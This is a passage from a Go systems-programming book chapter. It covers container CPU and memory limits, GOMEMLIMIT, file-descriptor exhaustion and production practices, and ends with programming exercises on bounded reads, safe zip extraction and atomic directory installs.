  binaries into `linux/`, rebuild the image, and run each with a writable
  `/tmp` (the tests need `t.TempDir`, and a `FROM scratch` image has no
  `/tmp`):
  #output("ch05/s13-testc.txt", cmd: "CGO_ENABLED=0 GOOS=linux go test -c -o linux/ ./fsx ./procx ./sysinfo")
  #output("ch05/s13-image2.txt", cmd: "docker build -q -f scratch.Dockerfile -t oskit linux")
  #output("ch05/s13-linuxtests.txt", cmd: "for p in fsx procx sysinfo; do printf '%-8s ' $p; \\\n    docker run --rm --init --tmpfs /tmp:rw,mode=1777 oskit /$p.test | tail -1; done")
  and the race detector over the whole module on your machine:
  #output("ch05/s13-race.txt", cmd: "go test -race ./...")
  #troubleshoot(
    ([#ts("s13-soft.txt")], [You expected 64 descriptors from `--ulimit nofile=64:4096`, but Go raised its own soft limit to the hard one at startup.], [Expected. See "Go raises its own descriptor limit".]),
    ([#ts("s13-notmp.txt")], [The test binary ran without `--tmpfs /tmp`, so `t.TempDir` has nowhere to create directories.], [Add `--tmpfs /tmp:rw,mode=1777`.]),
    ([#ts("s13-nowalk.txt")], [`ReadCgroup` stops at its own directory instead of walking up to `cgroupRoot`, so the slice's tighter 1 GiB limit is missed.], [Loop until `d == cgroupRoot`.]),
  )
]

=== Reading the results

Read the two container runs together. `runtime.NumCPU` is 10 both times:
it counts the CPUs the process may be scheduled on, and a CPU limit is a
time budget, not a set of CPUs. `GOMAXPROCS` dropped from 10 to 2, which is
the Go 1.25 container awareness from Chapter 4 at work: 1.5 CPUs of quota,
rounded up to a whole number of Ps. And `GOMEMLIMIT` is unlimited in both
runs. The runtime adapts its parallelism to the container but not its
memory target. A Go service in a 256 MiB container, by default, does not
start collecting harder as it approaches 256 MiB, because it does not know
the number exists. With `-set-memlimit` it does: the limit becomes 90
percent of `memory.max`.

Ten percent headroom is a starting point, not a law. Memory the Go runtime
does not manage (cgo allocations, thread stacks, the binary's mapped text)
and kernel memory charged to the cgroup (socket buffers, page cache for
files the process writes) all count against `memory.max`. Services with
large off-heap usage need more headroom. In Kubernetes there is also a
declarative route that needs no code:

#code(file: "deployment.yaml")[```yaml
env:
  - name: GOMEMLIMIT          # the runtime reads it at startup
    valueFrom:
      resourceFieldRef:
        resource: limits.memory
        divisor: "1"           # bytes; GOMEMLIMIT accepts a plain number
```]

That sets the limit to 100 percent of the container limit, which leaves no
headroom, so the code approach (or a hard-coded value per Deployment) is
better for services close to their limit. Either way, remember what
`GOMEMLIMIT` cannot do, which lab 2 showed: it makes the collector work
harder, but it cannot free memory that is still in use. Exercise 5.4 turns
`memLimitFor` into a reusable function that also understands
`memory.high`.

The descriptor run stopped at 250, not 256: stdin, stdout and stderr use
three, and the Go runtime holds the other three: the cgroup `cpu.max` file
it keeps open to notice CPU limit changes (Go 1.25), and the epoll
instance and wake-up descriptor of its network poller. `EMFILE` then
appears wherever the next descriptor is needed, often far from the leak:
in `net/http`, `Accept` fails, and the server logs "http: Accept error:
... too many open files" and retries after 5 ms, doubling up to a second,
while existing connections carry on. Watch the descriptor count
(`/proc/<pid>/fd`, or the `process_open_fds` metric from the Prometheus
client) as a leading indicator.

#newingo("1.19", title: [Go raises its own descriptor limit])[
  Many systems set a soft `RLIMIT_NOFILE` of 1024 for compatibility with
  `select(2)`, which Go never uses. Since Go 1.19, any program that imports
  `os` raises its soft limit to the hard limit at startup (current
  releases set it one below the hard limit, to detect a later `prlimit`
  from outside). When the program starts a child, the runtime restores the
  original soft limit in the child, so old C programs still get the value
  they expect. The `limits` run above shows the effect: Docker set 1024
  soft and 4096 hard, and the Go process reports 4095.
]

#interview(title: [“How does a container limit memory?”])[
  The runtime (runc, under containerd or Docker) creates a cgroup for the
  container and writes the limit to `memory.max`. Every page the
  container's processes touch is charged to it: heap, stacks, page cache
  for files they read and write, some kernel memory. When a charge would
  exceed the limit, the kernel reclaims first (clean page cache, swap if
  allowed) and, if that fails, runs the OOM killer _within the cgroup_,
  which sends `SIGKILL`, usually to the largest process. Kubernetes sees
  exit code 137 and reports `OOMKilled`. Then connect it to Go: no warning
  and no cleanup, `GOMEMLIMIT` makes the collector work harder but cannot
  shrink live data, and `memory.high` throttles instead of killing. For
  CPU, mention `cpu.max`, CFS throttling and `GOMAXPROCS`.
]

=== The production code

The step 13 module is the code the rest of the book uses. The repository
keeps `workbook/ch05/step13/fsx`, `procx` and `sysinfo` identical to
`pkg/fsx`, `pkg/procx` and `pkg/sysinfo`, and the commands identical to
`examples/ch05`, apart from import paths; `workbook/ch05/SYNC` lists the
pairs and CI checks them. Later chapters import
`github.com/rahulbalajee/platform-go/pkg/fsx` for atomic writes and locks,
and `pkg/procx` wherever a tool runs another program.

== Production notes <sec-os-production>

*Bounded input.* Every `io.ReadAll`, `os.ReadFile`, `Output()` and
`json.Unmarshal` in a code review deserves the question "who controls the
size of this?". If the answer is not "we do", bound it with
`io.LimitReader` or stream it. An OOM kill leaves no error message, so the
review is the cheapest place to catch it.

*Descriptor exhaustion.* Alert on open descriptors as a fraction of the
limit, not on errors: by the time `EMFILE` appears in logs, requests are
already failing. The usual causes in Go are unclosed response bodies (the
`bodyclose` linter in this repository catches most), `defer f.Close()`
inside a loop, and connections with no idle timeout.

*Zombies and PID limits.* Any container that runs other programs needs an
init. On a node with 5,000 containers, the few that leak zombies do not
show up in CPU or memory graphs; they show up as "fork: Resource
temporarily unavailable" once `pids.max` is reached. Graph `pids.current`
next to memory.

*Atomic config deploys.* Write the new version beside the old, `fsync`,
rename, `fsync` the directory, validate in the service, swap atomically
in memory, and keep serving the old config if the new one is bad. Roll
config out in waves like code, because a config that parses everywhere
can still be wrong everywhere.

*Subprocess hygiene.* Every command a tool runs needs a context, its own
process group, a grace period and a bound on its output. With 200
engineers, someone will wrap `terraform` in a script that backgrounds a
watcher; the group kill is the defence that does not depend on reviewing
their script.

*Linux in tests.* `sysinfo`'s parsing is tested on every OS through
`fstest.MapFS`; the real `/proc` and cgroup tests carry a `linux` build
tag and run in CI on Ubuntu, and in the `FROM scratch` image as the last
checkpoint showed. The same split (pure parsing behind an `fs.FS`, a thin
platform layer tested where it runs) works for any code that reads kernel
state.

#takeaways(
  [`io.Reader` and `io.Writer` are the whole I/O model: the caller owns the buffer, `Read` may return less than asked, EOF is not an error, and wrappers such as `LimitReader`, `MultiWriter` and `TeeReader` compose without buffering the stream.],
  [Bound every input you do not control. `io.ReadAll` on a file, a response body or a subprocess's output is a memory limit waiting to be found, and the OOM killer leaves no error message.],
  [`bufio.Scanner` stops at a token over its buffer size and `Scan` returns `false` as if at EOF. Always check `Err`; for untrusted input, read with `ReadSlice` and truncate long lines.],
  [Write file code against `fs.FS` and test it with `fstest.MapFS`. Use `os.Root` (Go 1.24, completed in 1.25) for any path that comes from outside, and refuse symlinks that leave the tree.],
  [Atomic replacement is six steps: temp file in the same directory, write, chmod, fsync, rename, fsync the directory. Each one prevents a specific failure.],
  [Use `flock` for single-instance tools: the kernel releases it when the holder dies, so it cannot go stale. Never delete the lock file on unlock.],
  [Run commands without a shell, in their own process group, with `Cancel` sending `SIGTERM` to the group and `WaitDelay` bounding the wait. Kill what is left of the group when the leader exits.],
  [A Go `SIGPIPE` on stdout kills the program unless someone called `signal.Notify` for it; then write errors must be checked. `SIGHUP` reloads should validate, then swap atomically.],
  [A container's PID 1 must reap orphans. Use `--init`, `tini` or `shareProcessNamespace`. Go adapts `GOMAXPROCS` to `cpu.max`, but sets no `GOMEMLIMIT` from `memory.max` unless you do.],
)

#exercise-set(5,
  (
    tier: "warm-up",
    title: [A bounded `ReadFile`],
    body: [
      Add `fsx.ReadFileLimit(name string, limit int64) ([]byte, error)`:
      the whole file, like `os.ReadFile`, but if the file has more than
      `limit` bytes, return `nil` and an error that matches a new
      `fsx.ErrTooLarge` with `errors.Is` and names the file. It must never
      read more than `limit + 1` bytes, so a FIFO or `/dev/zero` cannot
      exhaust memory. A missing file must still match `fs.ErrNotExist`.
    ],
    hint: [Lab 2's `io.ReadAll` box has the one-line idea. What does "one byte more" tell you?],
    tests: "workbook/ch05/exercises/ex1",
  ),
  (
    tier: "warm-up",
    title: [Prefix a child's output],
    body: [
      A tool that runs several commands wants their output labelled:
      `[terraform] Plan: 3 to add`. Write `procx.PrefixWriter`, an
      `io.Writer` created by `procx.NewPrefixWriter(w io.Writer, prefix string)`, that writes each complete line to `w` with the prefix in
      front. Writes can split lines anywhere, even one byte at a time, so
      hold an incomplete line until its newline arrives; `Flush() error`
      writes a final line that has none. `os/exec` copies stdout and
      stderr on two goroutines, so it must be safe for concurrent use, and
      a line must never be interleaved with another. Errors from `w` must
      be returned.
    ],
    hint: [Return `len(p)` from `Write` even when you only buffered. Why is that still honest?],
    tests: "workbook/ch05/exercises/ex2",
  ),
  (
    tier: "core",
    title: [Stale pid files, done properly],
    body: [
      Step 6 claimed that a pid file can detect staleness reliably if it
      records the start time as well as the PID. Design that scheme: what
      exactly goes in the file, how a starting process decides that an
      existing file is stale, and how it replaces the file. Then find the
      race that remains when two processes start at the same moment and
      both decide the file is stale, and try to close it without `flock`:
      how far can you get? Finally, list what a pid file still cannot do
      that `flock` does. Use what step 8
      taught about `/proc/<pid>/stat`.
    ],
    hint: [Which system calls are atomic? `O_EXCL` on create is one; what else from step 5 is?],
  ),
  (
    tier: "core",
    title: [Container-aware memory limit],
    body: [
      Turn `limits`' `memLimitFor` into
      `sysinfo.GoMemLimit(cg Cgroup, ratio float64) (limit int64, reason string)`: `ratio` times the cgroup's memory limit, using
      `memory.high` instead of `memory.max` when it is set and lower,
      because the kernel starts throttling there. Return 0 when the runtime
      should be left alone (an explicit `GOMEMLIMIT` in the environment, no
      memory limit at all, or a ratio outside `(0, 1]`) and always a reason
      string a tool can log. Make `limits -set-memlimit` use it and print
      the reason.
    ],
    hint: [The tests set `GOMEMLIMIT` with `t.Setenv`, including to the empty string. What should an empty value mean?],
    tests: "workbook/ch05/exercises/ex4",
  ),
  (
    tier: "core",
    title: [Zip archives too],
    body: [
      Add `fsx.ExtractZip(zr *zip.Reader, root *os.Root, lim Limits) error` with the same guarantees as `ExtractTar`: every operation
      through `root`, `O_EXCL`, permission bits only, symlinks that stay
      inside, and the `MaxFiles` and `MaxBytes` limits applied to what
      comes _out_ of the decompressor. In a zip archive a symlink is an
      entry with `fs.ModeSymlink` in its mode whose contents are the
      target. Share code with `ExtractTar` rather than copy it.
    ],
    hint: [A zip archive lists all its entries up front, in the central directory. Which limit can you check before extracting anything, and which one must you never trust the archive's own numbers for?],
    tests: "workbook/ch05/exercises/ex5",
  ),
  (
    tier: "stretch",
    title: [A staged directory install],
    body: [
      Write `fsx.InstallDir(src fs.FS, dst string) error`, which installs a
      whole tree so that a reader going through `dst` sees the complete old
      tree or the complete new one, never a mix, even while installs run
      back to back. A directory cannot be renamed over a non-empty
      directory, so make `dst` a symlink to a hidden version directory and
      rename a new symlink over it, as the kubelet does with `..data`.
      Flush the new tree to disk before the switch, refuse to replace a
      real directory at `dst`, leave no debris on failure, and clean up old
      versions without pulling one out from under a reader that resolved
      `dst` a moment ago.
    ],
    hint: [`os.CopyFS` copies an `fs.FS` into a directory. On macOS, a concurrent `open` through a symlink that is being replaced can fail with `EINVAL`; the tests allow that there and nowhere else.],
    tests: "workbook/ch05/exercises/ex6",
  ),
)
